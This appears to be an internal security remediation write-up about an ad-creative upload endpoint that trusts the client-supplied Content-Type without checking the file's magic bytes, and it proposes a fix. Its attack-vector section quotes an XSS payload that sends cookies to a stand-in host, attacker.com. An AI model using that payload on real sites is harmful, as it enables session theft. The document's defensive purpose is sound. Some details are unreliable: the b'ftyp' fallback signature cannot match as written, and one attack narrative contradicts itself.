# GAP-0040: No Server-Side MIME Magic-Byte Validation on Asset Upload — Remediation Write-up

## 1. Summary & Classification

**Plain-English statement**: The `_validate_asset` function at `app/routers/ads.py:87` rejects uploads whose `Content-Type` header does not match the expected MIME type for the asset slot (image, video, thumbnail). However, the `Content-Type` header is supplied by the browser (or an API client) and is never verified against the actual bytes of the uploaded file. An attacker can send a Windows PE executable, a PHP shell, or an HTML file with a forged `Content-Type: image/jpeg` header. The validation passes, the file is stored in S3, and the URL is written to the ad creative record.

- **Severity**: HIGH
- **Source ticket**: ADS-002
- **Status**: Open
- **Owning area**: Ads Platform / Creative Asset Management
- **Effort**: S
- **Claim verdict**: CLAIM OK — confirmed. `_validate_asset` at `app/routers/ads.py:87–102` checks only `content_type` (the header value passed by the client) and `len(data)` (file size). No byte-level inspection of `data` is performed. `upload_creative_asset` at `app/services/ad_creatives.py:125` writes `file_data` directly to S3 with the client-supplied `content_type` as the `ContentType` parameter, which becomes the `Content-Type` response header when the object is served.

**One-line impact**: An attacker can upload arbitrary file content disguised as a JPEG/PNG/MP4 creative asset; if the S3 bucket serves objects with the stored `Content-Type`, a browser may execute or parse the content as its declared type — enabling cross-site scripting, HTML injection, or other content-type confusion attacks.

**Related tickets**: ADS-002 (source), SEC-020 (SSRF via asset URLs), SECOPS-007 (dev/prod parity).

## 2. Current-State Investigation (Root Cause)

### The validation function

`app/routers/ads.py:87–102`:

```python
def _validate_asset(data: bytes, content_type: str | None, asset_type: str) -> None:
    if asset_type == "image":
        if content_type not in ("image/jpeg", "image/png", "image/webp"):
            raise HTTPException(400, "Image must be JPEG, PNG, or WebP")
        if len(data) > 5 * 1024 * 1024:
            raise HTTPException(400, "Image must be under 5 MB")
    elif asset_type == "video":
        if content_type != "video/mp4":
            raise HTTPException(400, "Video must be MP4")
        if len(data) > 50 * 1024 * 1024:
            raise HTTPException(400, "Video must be under 50 MB")
    elif asset_type == "thumbnail":
        if content_type not in ("image/jpeg", "image/png"):
            raise HTTPException(400, "Thumbnail must be JPEG or PNG")
        if len(data) > 2 * 1024 * 1024:
            raise HTTPException(400, "Thumbnail must be under 2 MB")
```

Only two checks are performed:
1. `content_type` (a string from `UploadFile.content_type`, which is the `Content-Type` header of the multipart part) is compared to an allowlist.
2. `len(data)` is compared to a size cap.

`data` (the actual file bytes, line 287: `data = await file.read()`) is never inspected for magic bytes.

### How the upload path propagates the unvalidated content

`app/routers/ads.py:287–290`:
```python
data = await file.read()
_validate_asset(data, file.content_type, asset_type)
url = upload_creative_asset(creative_id, campaign_id, data, file.content_type or "", asset_type)
```

`app/services/ad_creatives.py:141–146`:
```python
_get_s3().put_object(
    Bucket=UPLOAD_BUCKET,
    Key=key,
    Body=file_data,
    ContentType=content_type,   # ← client-supplied, unverified

```

The client-supplied `content_type` is passed as the S3 `ContentType` parameter. When S3 serves this object (either via CloudFront or a direct S3 URL), the `Content-Type` response header will be the attacker-supplied value. If the attacker supplies `Content-Type: text/html`, S3 will serve the object with `Content-Type: text/html` and a browser will render it as HTML.

### Contrast with the license agreement service (which does it right)

`app/services/license_agreements.py:47–90` provides the existing pattern for magic-byte validation:

```python
_MAGIC_BYTES = {
    "application/pdf": [b"%PDF"],
    "image/png": [b"\x89PNG"],
    "image/jpeg": [b"\xff\xd8\xff"],
    "image/webp": [b"RIFF"],
}

def _validate_magic_bytes(mime_type: str, head: bytes) -> bool:
    sigs = _MAGIC_BYTES.get(mime_type)
    if not sigs:
        return False
    return any(head.startswith(sig) for sig in sigs)
```

Called at line 130:
```python
if not _validate_magic_bytes(mime_type, file_bytes[:8]):
    raise HTTPException(400, "File content does not match declared MIME type")
```

The `_validate_asset` function in `ads.py` should apply the same pattern. The infrastructure already exists in the codebase; it simply has not been applied to the ad creative upload path.

### WebP magic byte subtlety

WebP files begin with `RIFF` (bytes 0–3), followed by 4 bytes of file size, followed by `WEBP` (bytes 8–11). A file that begins with `RIFF` but is not a WebP (e.g., a WAV file) would pass a check based only on the `RIFF` prefix. For the `image/webp` MIME type, the check should verify both `RIFF` at offset 0 and `WEBP` at offset 8:

```python
def _is_webp(data: bytes) -> bool:
    return data[:4] == b"RIFF" and data[8:12] == b"WEBP"
```

## 3. Impact / Exploit / Blast Radius

### Attack vector 1: HTML injection via content-type confusion

1. Attacker creates a file with contents: `<script>document.cookie='stolen='+document.cookie; fetch('https://attacker.com/steal?c='+document.cookie)</script>`.
2. Attacker names it `xss.html` and sends it as a multipart upload with `Content-Type: image/jpeg`.
3. `_validate_asset` passes (header says `image/jpeg`, size is small).
4. S3 stores the object with `ContentType=image/jpeg`.
5. **However**, if the attacker can influence which `ContentType` is stored (by sending `Content-Type: text/html` in a separate request or by manipulating the upload), the browser serves it as HTML.

Even without `Content-Type: text/html` tricks: if the object is fetched without the S3-stored content type (e.g., via a proxy that strips headers, or if CloudFront is configured with the wrong origin response header policy), a browser's content-sniffing may treat the file as HTML if it starts with `<`. Setting `X-Content-Type-Options: nosniff` on the S3/CloudFront response is one defense, but the proper fix is to reject non-conformant content at upload time.

### Attack vector 2: executable disguised as JPEG

1. Attacker compiles a small Windows PE executable.
2. Prepends 3 bytes of JPEG SOI marker garbage (since the SOI check is not performed).
3. Sends with `Content-Type: image/jpeg`.
4. File is accepted and stored.
5. The creative is submitted for admin review.
6. An admin reviewer downloads the creative asset to check it. The file is not a renderable image; if the reviewer opens it on Windows, it may attempt execution.

### Attack vector 3: SVG with embedded JavaScript

SVG files with embedded `<script>` tags are a known XSS vector. SVG is not in the allowlist for any asset type (`image/svg+xml` is not accepted), but the check is bypassable by setting `Content-Type: image/jpeg` while uploading an SVG body.

### Attack vector 4: PHP/shell upload chain

If the S3 bucket is served via a misconfigured application server (e.g., if future architecture adds a download proxy that invokes file interpreters), a PHP file uploaded as a JPEG could be executed.

### Blast radius

- Affects the ad creative upload endpoint: `POST /ui/ads/campaigns/{campaign_id}/creatives/{creative_id}/upload`.
- Any authenticated user can trigger the upload (ownership check is performed but no additional permissions beyond session auth required).
- Creative assets are typically served publicly (they are ad creatives visible to end users). A stored XSS payload in a "creative" could affect all users who see that ad.
- Admin reviewers who download uploaded creatives for manual inspection are at risk if the stored object contains executable content.

## 4. Fix Design (Code-Level)

### Magic-byte signatures for each allowed MIME type

```python
# app/routers/ads.py

# Magic-byte signatures: (mime_type → list of allowed byte prefixes)
_ASSET_MAGIC_BYTES: dict[str, list[bytes]] = {
    "image/jpeg": [b"\xff\xd8\xff"],          # JPEG SOI marker
    "image/png":  [b"\x89PNG\r\n\x1a\n"],     # PNG signature (8 bytes)
    "image/webp": [b"RIFF"],                   # checked further in _is_webp
    "video/mp4":  [
        b"\x00\x00\x00\x18ftyp",              # ftyp box, most common
        b"\x00\x00\x00\x1cftyp",
        b"\x00\x00\x00\x20ftyp",
        b"ftyp",                               # when box size isn't first
    ],
}

_MIN_MAGIC_BYTES = 12   # longest signature we check


def _check_magic_bytes(data: bytes, content_type: str) -> bool:
    """Return True if the file header matches the declared content_type."""
    if len(data) < _MIN_MAGIC_BYTES:
        return False
    head = data[:_MIN_MAGIC_BYTES]
    if content_type == "image/webp":
        # WebP: RIFF at 0–3 + WEBP at 8–11
        return head[:4] == b"RIFF" and head[8:12] == b"WEBP"
    sigs = _ASSET_MAGIC_BYTES.get(content_type)
    if not sigs:
        return False
    return any(head.startswith(sig) for sig in sigs)
```

### Updated `_validate_asset`

```python
def _validate_asset(data: bytes, content_type: str | None, asset_type: str) -> None:
    if asset_type == "image":
        if content_type not in ("image/jpeg", "image/png", "image/webp"):
            raise HTTPException(400, "Image must be JPEG, PNG, or WebP")
        if len(data) > 5 * 1024 * 1024:
            raise HTTPException(400, "Image must be under 5 MB")
        if not _check_magic_bytes(data, content_type):
            raise HTTPException(400, "File content does not match declared image type")
    elif asset_type == "video":
        if content_type != "video/mp4":
            raise HTTPException(400, "Video must be MP4")
        if len(data) > 50 * 1024 * 1024:
            raise HTTPException(400, "Video must be under 50 MB")
        if not _check_magic_bytes(data, content_type):
            raise HTTPException(400, "File content does not match declared video type")
    elif asset_type == "thumbnail":
        if content_type not in ("image/jpeg", "image/png"):
            raise HTTPException(400, "Thumbnail must be JPEG or PNG")
        if len(data) > 2 * 1024 * 1024:
            raise HTTPException(400, "Thumbnail must be under 2 MB")
        if not _check_magic_bytes(data, content_type):
            raise HTTPException(400, "File content does not match declared thumbnail type")
```

### Force correct Content-Type to S3 regardless of client header

In `app/services/ad_creatives.py:141–146`, the `ContentType` parameter should be the canonical MIME type (from the allowlist), not the client-supplied string. Since the client string is already validated to be in the allowlist by `_validate_asset`, they are equivalent after validation. However, as a defense-in-depth measure, the `upload_creative_asset` function can be modified to accept a canonicalized content type:

```python
# Already correct after _validate_asset passes; no further change needed here.
# The content_type passed to upload_creative_asset is one of the allowlisted values.
```

### Additional hardening: `X-Content-Type-Options: nosniff` on S3

When S3 objects are served, the S3 `put_object` call should set the `ContentDisposition` and ensure `X-Content-Type-Options: nosniff` is on CloudFront or the serving layer. This is a deployment/infrastructure concern outside the scope of this code fix.

### Dev/Prod parity (SECOPS-007)

`_validate_asset` is a pure Python function with no AWS, network, or file-system dependency. It operates on `bytes` and a `str`. It runs identically in:
- **Dev**: DynamoDB Local + in-process moto S3. The `_check_magic_bytes` call runs before `upload_creative_asset`, so no moto interaction changes.
- **Prod**: same Python code; the magic-byte check is env-agnostic.

No mock, no env flag, no feature flag needed. The fix satisfies SECOPS-007 trivially.

### Alternative considered: use python-magic library

The `python-magic` library wraps libmagic and provides robust file type detection. Rejected for this fix because:
1. It requires a native library dependency (`libmagic`) that must be installed on all deployment targets.
2. It introduces a dependency management burden.
3. The magic-byte signatures for the small, well-known set of accepted MIME types (JPEG, PNG, WebP, MP4) are stable and well-documented. An inline implementation is simpler and carries no dependency risk.
4. The pattern is already established in `app/services/license_agreements.py` without external libraries.

### Backward compatibility

Legitimate file uploads from browser file pickers will always have correct magic bytes (browsers read the actual file content when constructing multipart uploads). The only uploads that would newly fail are those where the file content does not match the declared type. This is the intended behavior — no legitimate use case is broken.

### Rollout

No schema changes, no DynamoDB changes, no infrastructure changes. The fix is three `if not _check_magic_bytes(...)` guards added to an existing function. Deploy as a normal code release.

### Rollback

Remove the `_check_magic_bytes` calls and the `_ASSET_MAGIC_BYTES`/`_check_magic_bytes`/`_MIN_MAGIC_BYTES` definitions. All uploads revert to header-only validation. No data migration needed.

### Risks

- **Legitimate upload rejection**: Edge cases where a browser constructs an upload with a valid file but an incorrect Content-Type header. These are vanishingly rare for standard image/video formats from modern browsers and native file pickers. If encountered, the error message is clear ("File content does not match declared image type") and the user can re-upload the correct file.
- **MP4 magic byte variants**: MP4/QuickTime files can have several `ftyp` box sizes. The implementation includes the three most common sizes (0x18, 0x1c, 0x20 bytes). Exotic MP4 variants (e.g., M4V, M4A rebranded as MP4) may use different box sizes. Expand the `_ASSET_MAGIC_BYTES["video/mp4"]` list if specific rejection reports arise. Using `b"ftyp"` at any offset within the first 8 bytes is a practical fallback.

### Effort

**S** — `_check_magic_bytes` function (~20 lines), three guard calls in `_validate_asset` (~6 lines), tests (~60 lines). Estimated: 2–3 hours.
